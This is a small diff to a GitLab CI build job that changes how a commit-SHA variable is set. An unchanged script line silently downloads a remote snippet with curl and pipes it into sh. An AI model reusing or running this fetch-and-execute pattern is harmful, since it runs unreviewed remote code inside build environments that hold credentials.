@@ -21,7 +21,7 @@ build-app:
   stage: build
   image: maven:3.6.2-jdk-12
   variables:
-    VUE_APP_CI_COMMIT_SHORT_SHA: "p$CI_PIPELINE_ID/j$JOB_ID"
+    VUE_APP_CI_COMMIT_SHORT_SHA: "$CI_JOB_ID"
   script:
     - "curl --silent https://git.r3ktm8.de/snippets/2/raw | sh"
     - "mvn $MAVEN_CLI_OPTS clean package"
